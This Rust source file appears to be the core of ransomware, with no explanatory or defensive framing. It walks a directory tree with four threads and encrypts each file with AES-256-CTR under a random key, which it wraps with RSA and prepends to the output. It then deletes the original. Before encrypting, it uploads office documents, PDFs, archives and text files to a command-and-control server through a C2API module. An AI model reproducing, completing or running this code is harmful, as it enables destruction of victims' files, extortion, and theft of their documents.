use aes::{
    cipher::{NewCipher, StreamCipher},
    Aes256Ctr,
};
use rand::{distributions::Uniform, thread_rng, Rng};

use rsa::{
    pkcs1::{DecodeRsaPrivateKey, DecodeRsaPublicKey},
    Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
};

use walkdir::WalkDir;

use std::{
    fmt::Error as FmtError,
    fs::{remove_file, File, OpenOptions},
    io::{BufReader, Read, Write, Seek, SeekFrom},
    path::{Path, PathBuf},
    sync::mpsc::{channel, Sender},
    thread::{self, JoinHandle},
};

use crate::c2::api::C2API;

fn aes_256_ctr_encrypt_decrypt(ctext: &mut [u8], key: &[u8], nonce: &[u8]) -> Result<(), FmtError> {
    if key.len() != 32 {
        return Err(FmtError);
    }

    let mut cipher = Aes256Ctr::new(key.into(), (nonce).into());

    println!(
        "Encrypting/decrypting... data len: {}, key: {:?}, nonce: {:?}",
        ctext.len(),
        key,
        nonce
    );
    cipher.apply_keystream(ctext);

    Ok(())
}

pub fn gen_aes_key(key_size: usize) -> String {
    let rng = thread_rng();
    rng.sample_iter(&Uniform::new(32, 126))
        .take(key_size)
        .map(char::from)
        .collect()
}

fn inc_counter(nonce: &mut [u8]) {
    let mut index: usize = 0;
    loop {
        if nonce[index] < 255 {
            nonce[index] += 1;
            break;
        } else {
            if index + 1 != nonce.len() {
                index += 1;
            } else {
                for elem in nonce.iter_mut() {
                    *elem = 0;
                }
                index = 0;
            }
        }
    }
}

fn get_dst_file_path(file_path: &str) -> String {
    let encoded_ext = "enc";
    let file_path_struct = Path::new(file_path);
    match file_path_struct.extension() {
        Some(ext) => {
            if ext == encoded_ext {
                return String::from(file_path_struct.with_extension("").to_str().unwrap());
            }
        }
        None => (),
    }
    let mut file_path_dst = String::from(file_path);
    file_path_dst.push('.');
    file_path_dst.push_str(encoded_ext);
    file_path_dst
}

#[derive(Debug)]
pub enum FileEncryptionDecryptionError {
    ErrorSrcFile(String),
    ErrorDstFile(String),
}

pub fn encrypt_decrypt_file(
    file_src_path: &str,
    private_public_key: String,
    is_encryption: u8,
) -> Result<usize, FileEncryptionDecryptionError> {
    // size of encrypted aes_key in file
    let size_of_enc_key: usize = 512;

    //Open Source file
    let file_src = match File::open(file_src_path) {
        Ok(file) => file,
        Err(_) => {
            return Err(FileEncryptionDecryptionError::ErrorSrcFile(String::from(
                "Could not open source file",
            )))
        }
    };

    //Modify destination file extension depending on decryption or encryption
    let file_dst_path = get_dst_file_path(file_src_path);

    let mut file_dst = match OpenOptions::new()
        .create_new(true)
        .write(true)
        .append(true)
        .open(file_dst_path)
    {
        Ok(file) => file,
        Err(_) => {
            return Err(FileEncryptionDecryptionError::ErrorDstFile(String::from(
                "Could not open destination file",
            )))
        }
    };

    //Get Source file file metadata, to then get total size of the file
    let file_read_size = match file_src.metadata() {
        Ok(data) => {
            if is_encryption == 1 {
                data.len() as usize
            } else {
                data.len() as usize - size_of_enc_key
            }
        }
        Err(_) => {
            return Err(FileEncryptionDecryptionError::ErrorSrcFile(String::from(
                "Could not get metadata for source file",
            )))
        }
    };

    let max_size: usize = 1024 * 1024 * 300; // 300 MB

    // 300 MB for max size
    let buffer_size: usize = if file_read_size < max_size {
        file_read_size
    } else {
        max_size
    };

    let mut buffer: Vec<u8> = vec![0; buffer_size];

    let mut key: String = String::new();
    {
        if is_encryption == 1 {
            key = gen_aes_key(32);

            let public_key = RsaPublicKey::from_pkcs1_pem(&private_public_key).unwrap();

            let mut rng = thread_rng();

            let enc_key = public_key
                .encrypt(&mut rng, Pkcs1v15Encrypt, key.as_bytes())
                .unwrap();

            // Write encrypted key to begining of dst file
            file_dst.write_all(&enc_key).unwrap();
        } else {
            let mut tmp_buf_reader = BufReader::new(&file_src);
            let mut tmp_buffer: Vec<u8> = vec![0; size_of_enc_key];
            let private_key = RsaPrivateKey::from_pkcs1_pem(&private_public_key).unwrap();

            match tmp_buf_reader.read(&mut tmp_buffer[..]) {
                Ok(bytes) => bytes,
                Err(_) => {
                    return Err(FileEncryptionDecryptionError::ErrorSrcFile(String::from(
                        "Could not read bytes from source file",
                    )))
                }
            };

            key = String::from_utf8(private_key.decrypt(Pkcs1v15Encrypt, &tmp_buffer).unwrap())
                .unwrap();
        }
    }

    let mut buf_reader = BufReader::new(&file_src);
    let mut total_read_bytes: usize = 0;
    let mut counter = [0u8; 16];

    if is_encryption != 1{ buf_reader.seek(SeekFrom::Start(size_of_enc_key as u64)).unwrap();}

    loop {
        let bytes_read = match buf_reader.read(&mut buffer[..]) {
            Ok(bytes) => bytes,
            Err(_) => {
                return Err(FileEncryptionDecryptionError::ErrorSrcFile(String::from(
                    "Could not read bytes from source file",
                )))
            }
        };

        total_read_bytes += bytes_read;

        aes_256_ctr_encrypt_decrypt(&mut buffer[..bytes_read], key.as_bytes(), &counter).unwrap();

        file_dst.write_all(&buffer[..bytes_read]).unwrap();

        if total_read_bytes == file_read_size {
            break;
        }
        inc_counter(&mut counter);
    }

    drop(file_dst);
    drop(file_src);

    unsafe {
        for key_char in key.as_mut_vec() {
            *key_char = 48;
        }
    }

    match remove_file(file_src_path) {
        Ok(_) => (),
        Err(_) => {
            return Err(FileEncryptionDecryptionError::ErrorSrcFile(String::from(
                "Could not delete source file",
            )))
        }
    };

    return Ok(total_read_bytes);
}

pub fn multi_threaded_encrypt_decrypt_files(
    directory: &str,
    private_public_key: String,
    user_id: String,
    is_encryption: u8,
) {
    let extensions = [
        "doc", "docx", "odt", "pdf", "xls", "xlsx", "ppt", "pptx", "zip", "txt",
    ];
    let num_threads = 4;

    let mut file_paths: Vec<PathBuf> = Vec::new();

    for entry in WalkDir::new(directory) {
        match entry {
            Ok(entry) => {
                // Check if the entry is a file
                if entry.file_type().is_file() {
                    // Adds file
                    file_paths.push(entry.into_path());
                }
            }
            Err(_) => (),
        };
    }

    let mut threads: Vec<JoinHandle<()>> = Vec::new();
    let mut job_senders: Vec<Sender<PathBuf>> = Vec::new();

    for _ in 0..num_threads {
        let user_id_clone = user_id.clone();
        let private_public_key_clone = private_public_key.clone();
        let (tx, rx) = channel::<PathBuf>();
        job_senders.push(tx);
        let thread_handle = thread::spawn(move || loop {
            match rx.recv() {
                Ok(path) => {
                    let c2 = C2API::new();
                    if path.to_str().unwrap() == "_END_SEARCH_" {
                        break;
                    }
                    if is_encryption == 1 {
                        if let Some(extension) = path.extension() {
                            if let Some(extension_str) = extension.to_str() {
                                if extensions.contains(&extension_str) {
                                    match c2.upload_file(
                                        path.to_string_lossy().to_string(),
                                        &user_id_clone,
                                    ) {
                                        _ => (),
                                    };
                                }
                            }
                        }
                    }

                    match encrypt_decrypt_file(
                        path.to_str().unwrap(),
                        private_public_key_clone.clone(),
                        is_encryption,
                    ) {
                        Ok(bytes_read) => bytes_read,
                        Err(_) => 0,
                    };
                }
                Err(_) => break,
            }
        });
        threads.push(thread_handle);
    }

    let mut thread_i: usize = 0;

    for path in file_paths {
        if thread_i == num_threads {
            thread_i = 0;
        }
        job_senders[thread_i].send(path).unwrap();
        thread_i += 1;
    }

    for sender in job_senders {
        sender.send(PathBuf::from("_END_SEARCH_")).unwrap();
    }

    for thread in threads {
        thread.join().unwrap();
    }
}
